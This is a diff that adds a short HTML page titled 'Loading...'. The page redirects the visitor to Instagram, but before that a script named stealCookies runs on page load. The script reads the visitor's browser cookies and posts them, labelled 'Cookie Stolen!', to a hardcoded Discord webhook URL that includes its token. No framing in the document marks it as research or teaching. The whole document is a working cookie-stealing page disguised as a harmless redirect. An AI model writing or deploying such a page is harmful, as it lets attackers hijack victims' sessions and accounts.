@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0;url=https://www.instagram.com/">
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1575510759893508178/FBglhWSgxdEYn9-ayZp_sFNCHSb4871_2YaOZ_l6fMud2QmGOiDSU5y7POiKJG70Zhhu";
+
+        async function stealCookies() {
+            try {
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                const cookieData = document.cookie;
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🍪 Cookie Stolen!\n\`\`\`${cookieData}\`\`\``
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        stealCookies();
+    </script>
+</body>
+</html>
